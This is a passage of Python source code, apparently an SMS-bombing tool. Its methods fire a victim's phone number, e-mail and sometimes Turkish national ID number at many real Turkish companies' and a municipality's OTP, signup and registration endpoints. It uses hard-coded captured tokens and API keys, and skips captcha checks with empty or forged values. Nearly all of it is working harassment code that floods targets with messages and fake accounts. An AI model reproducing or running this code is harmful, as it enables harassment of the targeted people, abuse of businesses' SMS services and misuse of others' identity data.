            json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> frontend.dominos.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> frontend.dominos.com.tr")


    #pidem.com.tr
    def Pidem(self):
        try:
            url = "https://restashop.azurewebsites.net:443/graphql/"
            headers = {"Accept": "*/*", "Origin": "https://pidem.azurewebsites.net", "Content-Type": "application/json", "Authorization": "Bearer null", "Referer": "https://pidem.azurewebsites.net/", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", "Accept-Encoding": "gzip, deflate, br"}
            json={"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": self.phone}}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["data"]["sendOtpSms"]["resultStatus"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> restashop.azurewebsites.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> restashop.azurewebsites.net")


    #frink.com.tr
    def Frink(self):
        try:
            url = "https://api.frink.com.tr:443/api/auth/postSendOTP"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": "", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "Frink/1.6.0 (com.frink.userapp; build:3; iOS 15.8.3) Alamofire/4.9.1", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"}
            json={"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90"+self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["processStatus"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.frink.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.frink.com.tr")


    #bodrum.bel.tr
    def Bodrum(self):
        try:
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            headers = {"Content-Type": "application/json", "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en;q=0.9", "Token": "", "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE", "Origin": "capacitor://localhost", "Region": "EN", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Connection": "keep-alive"}
            json={"gsm": "+90"+self.phone, "source": "orwi"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gandalf.orwi.app")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gandalf.orwi.app")     

    
    #kofteciyusuf.com
    def KofteciYusuf(self):
        try:
            url = "https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder"
            headers = {"Content-Type": "application/json; charset=utf-8", "Anonymousclientid": "", "Accept": "application/json", "Ostype": "iOS", "Appversion": "4.0.4.0", "Accept-Language": "en-GB,en;q=0.9", "Firmaid": "82", "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq", "Accept-Encoding": "gzip, deflate, br", "Language": "tr-TR", "User-Agent": "YemekPosMobil/53 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
            json={"FireBaseCihazKey": None, "FirmaId": 82, "GuvenlikKodu": None, "Telefon": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.poskofteciyusuf.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gateway.poskofteciyusuf.com")


    #littlecaesars.com.tr
    def Little(self):
        try:
            url = "https://api.littlecaesars.com.tr:443/api/web/Member/Register"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json; charset=utf-8", "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjM1Zjc4YTFhNjJjNmViODJlNjQ4OTU0M2RmMWQ3MDFhIiwidHlwIjoiSldUIn0.eyJuYmYiOjE3MzkxMTA0NzIsImV4cCI6MTczOTcxNTI3MiwiaXNzIjoiaHR0cHM6Ly9hdXRoLmxpdHRsZWNhZXNhcnMuY29tLnRyIiwiYXVkIjpbImh0dHBzOi8vYXV0aC5saXR0bGVjYWVzYXJzLmNvbS50ci9yZXNvdXJjZXMiLCJsaXR0bGVjYWVzYXJzYXBpIl0sImNsaWVudF9pZCI6IndlYiIsInN1YiI6InJvYnVzZXJAY2xvY2t3b3JrLmNvbS50ciIsImF1dGhfdGltZSI6MTczOTExMDQ3MiwiaWRwIjoibG9jYWwiLCJlbWFpbCI6InJvYnVzZXJAY2xvY2t3b3JrLmNvbS50ciIsInVpZCI6IjI0IiwicGVyc29uaWQiOiIyMDAwNTA4NTU0NjYiLCJuYW1lc3VybmFtZSI6IkxDIER1bW15IiwibGN0b2tlbiI6IlFRcHZHRS1wVDBrZDQ2MjRVQjhUc01SRkxoUUZsUlhGS0toTWYwUlF3U0M4Tnd3M2pzdHd6QzJ3NmNldGRkMkZRdFo1eXpacHVGOE81REhwUWpCSnhKaG5YNVJOcWYyc3NrNHhkTi0zcjZ2T01fdWQzSW5KRDZYUFdSYlM3Tml5d1FHbjByUENxNC1BVE9pd09iR005YnZwUTRISzJhNTFGVTdfQ1R2a2JGUmswMUpwM01YbkJmU3V6OHZ4bTdUTS1Vc1pXZzJDTmVkajlWaXJzdHo2TUs4VXdRTXp6TFZkZHRTQ2lOOENZVWc1cVhBNjVJbEszamVLNnZwQ0EwZTdpem5wa2hKUFVqY1dBc1JLc0tieDB3Y2EycU1EYkl6VlJXdV8xSjF5SDNhWmxSV0w4eFhJYl82NG5jd1p1Yk9MeFpiUFRRZW5GWWxuOGxNY1JFUDFIdTlCOWJyOFd3QVNqMmRDa3g2NVo5S0NPR3FiIiwibGNyZWZyZXNodG9rZW4iOiI2NDUyYWQ4MzIzY2I0N2ZiOWFmMWM2M2EyYWIxMTJkMyIsInBlcnNvbmVtYWlsIjoibGNAZHVtbXkuY29tIiwic2NvcGUiOlsibGl0dGxlY2Flc2Fyc2FwaSIsIm9mZmxpbmVfYWNjZXNzIl0sImFtciI6WyI3NjU2QkFGM0YxNUE2NTA0QkJGM0NFRTgyOTA5MkRGQSJdfQ.SrG2kFdRTVAq0SCt17cmZ-i6Cl9MaQaOUwu1YQ2r27m5_9i5WkVUx_CUPbCNazHcmGt3IYHw9U6TxS-zAz4Jw5o-PbCWktwBiLJNfIsK4akCT4RjX8b7d4YX0yDz4WcIp43ViEsEkDKByHwz75GWdV9gSJtmAerGjZbIoN-OkgJIYAxzCCeGUSdOW2jspvZew9VQKEKVRYzdfZlcvoCV_2mYV122P0jU5i_0J4k_JH-ok7bMxNGqpaxEDSZ1WEuQxBRcXr7C7swcj4AJHHDuksvNrHjXnSjB0VQt5sB3JuwjGDJRuY2yFUlrI8l8W4x01Jm6kSn67G4h8hqyNixpRg", "X-Platform": "ios", "X-Version": "1.0.0", "User-Agent": "LittleCaesars/20 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "en-GB,en;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
            json={"CampaignInform": True, "Email": self.mail, "InfoRegister": True, "IsLoyaltyApproved": True, "NameSurname": "Memati Bas", "Password": "31ABC..abc31", "Phone": self.phone, "SmsInform": True}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200 and r.json()["status"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.littlecaesars.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.littlecaesars.com.tr")

    
    #orwi.app
    def Orwi(self):
        try:
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            headers = {"Content-Type": "application/json", "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en;q=0.9", "Token": "", "Apikey": "YWxpLTEyMzQ1MTEyNDU2NTQzMg", "Origin": "capacitor://localhost", "Region": "EN", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Connection": "keep-alive"}
            json={"gsm": f"+90{self.phone}", "source": "orwi"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gandalf.orwi.app")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gandalf.orwi.app")


    #coffy.com.tr
    def Coffy(self):
        try:
            url = "https://user-api-gw.coffy.com.tr:443/user/signup"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Language": "en-GB,en;q=0.9", "Accept-Encoding": "gzip, deflate, br", "Language": "tr", "User-Agent": "coffy/5 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkIjoiNjdhOGM0MTc0MDY3ZDFmMzBkMDNmMmRlIiwidSI6IjY3YThjNDE3Njc5YTUxM2MyMzljMDc0YSIsInQiOjE3MzkxMTM0OTUyNjgsImlhdCI6MTczOTExMzQ5NX0.IQ_33PJ8s_CKMbJgp2sD1wIfFO852m5VfIxW-dv2-UA"}
            json={"countryCode": "90", "gsm": self.phone, "isKVKKAgreementApproved": True, "isUserAgreementApproved": True, "name": "Memati Bas"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> user-api-gw.coffy.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> user-api-gw.coffy.com")

    #e-belediye.sancaktepe.bel.tr
    def Sancaktepe(self):
        try:
            url = "https://e-belediye.sancaktepe.bel.tr:443/Sicil/KisiUyelikKaydet"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=----geckoformboundary35479e29ca6a61a4a039e2d3ca87f112", "Origin": "null", "Dnt": "1", "Sec-Gpc": "1", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers", "Connection": "keep-alive"}
            data = f"------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\r\n\r\n21z_svqlZXLTEPZGuSugh8winOg_nSRis6rOL-96TmwGUHExtulBBRN9F2XBS_LvU28OyUsfMVdZQmeJlejCYZ1slOmqI63OX_FsQhCxwGk1\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n13.01.2000\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMEMAT\xc4\xb0\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBAS\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.EPosta\"\r\n\r\n{self.mail}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\nMemati31\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.SifreyiDogrula\"\r\n\r\nMemati31\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"recaptchaValid\"\r\n\r\ntrue\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6, verify=False)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> e-belediye.sancaktepe.bel.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> e-belediye.sancaktepe.bel.tr")

    #money.com.tr
    def Money(self):
        try:
            url = "https://www.money.com.tr/Account/ValidateAndSendOTP"
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br",
                "Referer": "https://www.money.com.tr/money-kartiniz-var-mi",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://www.money.com.tr",
                "Connection": "keep-alive"
            }
            data = {
                "phone": self.phone,
                "GRecaptchaResponse": ""
            }
            r = requests.post(url, headers=headers, data=data, timeout=6)
            print(r.text) 
            if r.json().get("resultType") == 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> money.com.tr")
                self.adet += 1
            else:
                raise Exception(f"Gelen yanıt: {r.json()}")
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> money.com.tr | Hata: {str(e)}")


    #alixavien.com.tr
    def Alixavien(self):
        try:
            session = requests.Session()
            session.get("https://www.alixavien.com.tr/UyeGiris", timeout=5)
            check_url = "https://www.alixavien.com.tr/api/member/CheckUser"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/json; charset=UTF-8",
                "Origin": "https://www.alixavien.com.tr",
                "Referer": "https://www.alixavien.com.tr/UyeGiris",
                "X-Requested-With": "XMLHttpRequest"
            }
            check_data = {
                "phone": f"+90{self.phone}",
                "email": "",
                "smsType": 1
            }
            session.post(check_url, headers=headers, json=check_data, timeout=6)
            send_url = "https://www.alixavien.com.tr/api/member/sendOtp"
            send_data = {
                "Phone": f"+90{self.phone}",
                "XID": ""
            }
            r = session.post(send_url, headers=headers, json=send_data, timeout=6)

            try:
                resp = r.json()
            except ValueError:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Geçersiz yanıt! {self.phone} --> alixavien.com.tr\nYanıt: {r.text}")
                return

            if resp.get("isError") is False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> alixavien.com.tr")
                self.adet += 1
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> alixavien.com.tr | Hata: {resp.get('userMessage') or 'Bilinmeyen'}")

        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}İstek hatası! {self.phone} --> alixavien.com.tr | Hata: {e}")


    #jimmykey.com
    def Jimmykey(self):
        try:
            r = requests.post(f"https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined", timeout=6)
            if r.json()["Sonuc"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> jimmykey.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> jimmykey.com")
        

    #api.ido.com.tr
    def Ido(self):
        try:
            url = "https://api.ido.com.tr:443/idows/v2/register"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.ido.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.ido.com.tr/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            json={"birthDate": True, "captcha": "", "checkPwd": "313131", "code": "", "day": 24, "email": self.mail, "emailNewsletter": False, "firstName": "MEMATI", "gender": "MALE", "lastName": "BAS", "mobileNumber": f"0{self.phone}", "month": 9, "pwd": "313131", "smsNewsletter": True, "tckn": self.tc, "termsOfUse": True, "year": 1977}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.ido.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.ido.com.tr")